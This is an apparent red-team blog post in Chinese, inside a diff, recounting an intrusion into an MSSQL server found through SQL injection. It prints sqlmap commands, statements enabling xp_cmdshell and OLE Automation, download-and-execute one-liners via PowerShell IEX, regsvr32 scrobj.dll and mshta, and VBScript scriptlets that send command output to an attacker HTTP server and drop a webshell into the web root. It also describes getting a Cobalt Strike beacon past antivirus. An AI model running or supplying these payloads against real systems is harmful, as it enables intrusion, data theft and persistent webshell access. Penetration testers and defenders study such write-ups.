@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Regsvr32 ole对象 « 倾旋的博客</title>
+  <meta name="description" content="某次项目技术点实录-Regsvr32 ole对象由于环境都无法进行演示，目前取得都是历史留存的截图突破口一开始是一个外网的SQL注入，通过sqlmap正常操作，得知是DBA权限，数据库：MSSQLsqlmap.py -u " http:>
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="https://payloads.online/archivers/2019-07-19/1">
+  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
+<script>MathJax={"tex":{"inlineMath":[["$","$"],["\\(","\\)"]],"displayMath":[["$$","$$"],["\\[","\\]"]]},"svg":{"fontCache":"global"},"svg":{"fontCache":"global"}}</script><script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script><script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+</head>
+
+
+  <body>
+
+    <div class="header-placeholder"></div>
+<header class="header">
+  <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    <a class="site-title" href="/">倾旋的博客</a>
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">About</a>
+      
+        
+        <a class="page-link" href="/posts/">Posts</a>
+      
+        
+        <a class="page-link" href="/links/">Links</a>
+      
+        
+        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
+      
+        
+        <a class="page-link" href="/feed.xml">RSS</a>
+      
+    </nav>
+  </div>
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <div class="col-main">
+          <div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">Regsvr32 ole对象</h1>
+    <p class="post-meta">Jul 19, 2019</p>
+  </header>
+
+  <article class="post-content">
+    <h1 id="某次项目技术点实录-regsvr32-ole对象">某次项目技术点实录-Regsvr32 ole对象</h1>
+
+<p><strong>由于环境都无法进行演示，目前取得都是历史留存的截图</strong></p>
+
+<h2 id="突破口">突破口</h2>
+
+<p>一开始是一个外网的SQL注入，通过sqlmap正常操作，得知是DBA权限，数据库：MSSQL</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap.py -u "http://xxx.com/xxx/xxx.aspx?yum=xx&xx=xx" -p yhm --random-agent --cookie='ASP.NET_SessionId=xxxx'
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-13-57-49.png" alt=""></p>
+
+<p>直接通过<code class="language-plaintext highlighter-rouge">--os-shell</code>来执行命令：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[18\:39\:23] [INFO] checking if xp_cmdshell extended procedure is available, please wait..
+xp_cmdshell extended procedure does not seem to be available. Do you want sqlmap to try to re-enable it? [Y/n] Y
+[18\:39\:25] [WARNING] xp_cmdshell re-enabling failed
+</code></pre></div></div>
+
+<h3 id="启用xp_cmdshell">启用xp_cmdshell</h3>
+
+<p>手动启动语句：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
+</code></pre></div></div>
+
+<p>执行：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exec master..xp_cmdshell "whoami"
+</code></pre></div></div>
+
+<h3 id="启用ole-automation">启用OLE Automation</h3>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-15-19-48.png" alt=""></p>
+
+<p>通过启用xp_cmdshell失败，sqlmap还会尝试<code class="language-plaintext highlighter-rouge">sp_OACreate</code>，<code class="language-plaintext highlighter-rouge">sp_OACreate</code>这个方式是不带回显的，通常利用语句如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EXEC sp_configure 'show advanced options', 1;   
+RECONFIGURE WITH OVERRIDE;   
+EXEC sp_configure 'Ole Automation Procedures', 1;
+RECONFIGURE WITH OVERRIDE;   
+EXEC sp_configure 'show advanced options', 0;
+</code></pre></div></div>
+
+<p>执行：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami &gt;C:\who.txt'
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-07-02.png" alt=""></p>
+
+<p>通过调用<code class="language-plaintext highlighter-rouge">sp_oacreate</code>能够获得一个数字返回值，若全是0，则执行失败，必须有1。</p>
+
+<h2 id="判断网络环境">判断网络环境</h2>
+
+<p>能执行命令后，为了判断能否出网，先尝试DNS Log。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-08-54.png" alt=""></p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-09-18.png" alt=""></p>
+
+<p>在<code class="language-plaintext highlighter-rouge">os-shell</code>中，执行：<code class="language-plaintext highlighter-rouge">nslookup xxxxx.net</code>，burp看回显即可。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-11-13.png" alt=""></p>
+
+<p>DNS能出，接下来看TCP报文…</p>
+
+<p>这里我使用<code class="language-plaintext highlighter-rouge">certutil</code>、<code class="language-plaintext highlighter-rouge">bitsadmin</code>命令来测试，但是么有截图…</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3 -m http.server
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>os-shell&gt;certutil -urlcache -split -f http://xxx:8000/
+</code></pre></div></div>
+
+<p>收到相应的请求后，基本上稳妥了，可以采用<code class="language-plaintext highlighter-rouge">reverse_tcp</code>的方案，用powershell反弹一个beacon到cobalt strike上。</p>
+
+<h2 id="regsvr32妙用">Regsvr32妙用</h2>
+
+<p>测试的过程中，并不顺利，后来我发现它有反病毒软件…</p>
+
+<p>尝试了以下方法：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/a22'))"
+
+regsvr32 /s /n /u /i\:http\://x.x.0.x:8080/zfgJrh6V.sct scrobj.dll
+
+mshta http://xxx.xx.xx.xx/1.hta
+</code></pre></div></div>
+
+<p>然后我发现msf <code class="language-plaintext highlighter-rouge">exploit/multi/script/web_delivery</code>生成的地址，都会在底层调用一层<code class="language-plaintext highlighter-rouge">powershell</code></p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-45-14.png" alt=""></p>
+
+<p>目前，这种download+iex方式肯定不行了，然后我就改了几个脚本，通过HTTP Log来回显执行结果：</p>
+
+<p>获取进程列表：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?XML version="1.0"?&gt;
+&lt;scriptlet&gt;
+	&lt;registration progid="d08c96" classid="{cea46581-c344-4157-b891-30f358f1522d}" &gt;
+		&lt;script language="vbscript"&gt;
+&lt;![CDATA[
+Sub getName(name)
+  	Dim http
+	Set http = CreateObject("Msxml2.ServerXMLHTTP")
+	http.open "GET","http://xxx.xxx.xxx.xxx:8086/"+name, False
+	http.send
+End Sub
+
+Sub Cmd(command)
+Set oShell = CreateObject("WScript.Shell")
+Set Re = oShell.Exec(command)
+
+Do While Not Re.StdOut.AtEndOfStream
+	getName Re.StdOut.ReadLine()
+Loop
+End Sub
+
+Cmd "powershell -w hidden -c $s=Get-Process;$process ='';foreach ($n in $s){$process += $n.Name+'|'}$Bytes = [System.Text.Encoding]::Unicode.GetBytes($process);$EncodedText =[Convert]::ToBase64String($Bytes);Write-Host $EncodedText;exit;"
+]]&gt;
+		&lt;/script&gt;
+	&lt;/registration&gt;
+&lt;/scriptlet&gt;
+</code></pre></div></div>
+
+<p>执行：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic process call create "regsvr32 /s /n /u /i\:http\://xxx.xxx.xxx.xxx:8086/p.txt scrobj.dll"
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-51-18.png" alt=""></p>
+
+<p>获得回显。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-48-39.png" alt=""></p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-49-25.png" alt=""></p>
+
+<p>获得进程列表后，看到有<code class="language-plaintext highlighter-rouge">EST Nod32</code>、<code class="language-plaintext highlighter-rouge">360</code>等防护软件，看来需要做的工作有很多。</p>
+
+<p>列目录：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?XML version="1.0"?&gt;
+&lt;scriptlet&gt;
+	&lt;registration progid="d08c96" classid="{cea46581-c344-4157-b891-30f358f1522d}" &gt;
+		&lt;script language="vbscript"&gt;
+&lt;![CDATA[
+Sub getName(name)
+  	Dim http
+	Set http = CreateObject("Msxml2.ServerXMLHTTP")
+	http.open "GET","http://xxx.xxx.xxx.xxx:8086/"+name, False
+	http.send
+End Sub
+
+Sub Cmd(command)
+Set oShell = CreateObject("WScript.Shell")
+Set Re = oShell.Exec(command)
+
+Do While Not Re.StdOut.AtEndOfStream
+	getName Re.StdOut.ReadLine()
+Loop
+End Sub
+
+Cmd "powershell -w hidden -c $s=Get-ChildItem D:\web4_new\;$process ='';foreach ($n in $s){$process += $n.Name+'|'}$Bytes = [System.Text.Encoding]::Unicode.GetBytes($process);$EncodedText =[Convert]::ToBase64String($Bytes);Write-Host $EncodedText;exit;"
+]]&gt;
+		&lt;/script&gt;
+	&lt;/registration&gt;
+&lt;/scriptlet&gt;
+</code></pre></div></div>
+
+<p>下载Webshell：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?XML version="1.0"?&gt;
+&lt;scriptlet&gt;
+	&lt;registration progid="d08c96" classid="{cea46581-c344-4157-b891-30f358f1522d}" &gt;
+		&lt;script language="vbscript"&gt;
+		&lt;![CDATA[
+Set Shell = CreateObject("Wscript.Shell")
+Set Post = CreateObject("Msxml2.XMLHTTP")
+wfolder = "C:\inetpub\wwwroot\xxx11english.aspx"
+Post.Open "GET","http://xxx.xxxx.xxx.xxx:85/bak/english.txt",0
+Post.Send()
+Set aGet = CreateObject("ADODB.Stream")
+aGet.Mode = 3
+aGet.Type = 1
+aGet.Open()
+aGet.Write(Post.responseBody)
+
+aGet.SaveToFile wfolder,2
+
+		]]&gt;
+		&lt;/script&gt;
+	&lt;/registration&gt;
+&lt;/scriptlet&gt;
+</code></pre></div></div>
+<p>通过指定不同的txt，执行不同的代码。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-53-53.png" alt=""></p>
+
+<p>当然，毫无疑问的最终获得了beacon：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-54-58.png" alt=""></p>
+
+<p>免杀环节就不记录了。</p>
+
+<h2 id="总结">总结</h2>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-59-19.png" alt=""></p>
+
+<p>外网多个SQL注入-SQL Server DBA，无回显，360+ESET NOD32 Antivirus，regsvr32通过一个ole对象执行VBscript，使用<code class="language-plaintext highlighter-rouge">--os-shell</code>，底层执行的父进程是一个mssql service，所以av可能不那么关注，但是通过–os-shell直接创建powershell，就会被拦截；</p>
+
+<p>通过加载我服务器上的sct文件，执行自定义的vbs之外，我发现它不会阻止vbs派生powershell；</p>
+
+<p>但是通过vbs直接派生powershell下载代码执行、或直接反弹，都被干掉。由于没有回显，无法确定我免杀的木马落地目录，只能用powershell获取目录、当前用户情况，返回base64，交给vbs，请求http log。得到服务器环境，最终确定落地目录后，基本上就可以getshell、上线等操作。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-15-08-36.png" alt=""></p>
+
+<p>由于反病毒软件会监控xp_cmdshell，一执行就会返回<code class="language-plaintext highlighter-rouge">CreateProcess Error Code 5</code>等问题，<code class="language-plaintext highlighter-rouge">sp_oacreate</code>是能够解决，但是没有回显，可通过发送网络请求来看。</p>
+
+<p>sp_oacreate是基于ole对象的，ole对象执行拦截的较少、包括regsvr32也是调用的ole对象去执行vbs代码，这其中有一种白名单派生关系。</p>
+
+<p>语法</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sp_OACreate progid, | clsid,
+objecttoken OUTPUT
+[ , context ]
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami &gt;C:\who.txt'
+</code></pre></div></div>
+
+<p>其中<code class="language-plaintext highlighter-rouge">'wscript.shell'</code>就是一个对象，这个对象可以是其他ole对象，具体还需要继续发掘。。</p>
+
+
+  </article>
+  
+  
+
+
+
+
+</div>
+
+        </div>
+        <div class="col-second">
+          <div class="col-box col-box-author">
+  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
+  <div class="col-box-title name">倾旋</div>
+  <p>特点：爪子长、个子高、身体瘦弱
+</p>
+  <p class="contact">
+    
+    <a href="https://github.com/Rvn0xsy">GitHub</a>
+    
+    
+    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
+    
+    
+    <a href="mailto:rvn0xsy@gmail.com">Email</a>
+    
+    <a href="#">微信</a>
+    
+  </p>
+</div>
+
+<div class="col-box">
+  <div class="col-box-title">Newest Posts</div>
+  <ul class="post-list">
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
+    
+    <li><a class="post-link" href="/posts/">更多....</a></li>
+  </ul>
+</div>
+
+<div class="col-box post-toc hide">
+  <div class="col-box-title">TOC</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    <footer class="footer">
+<div class="wrapper">
+© 2021 倾旋
+</div>
+</footer>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-158746438-1');
+</script>
+
+<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
+<script src="/js/easybook.js"></script>
+
+
+  </body>
+
+</html>
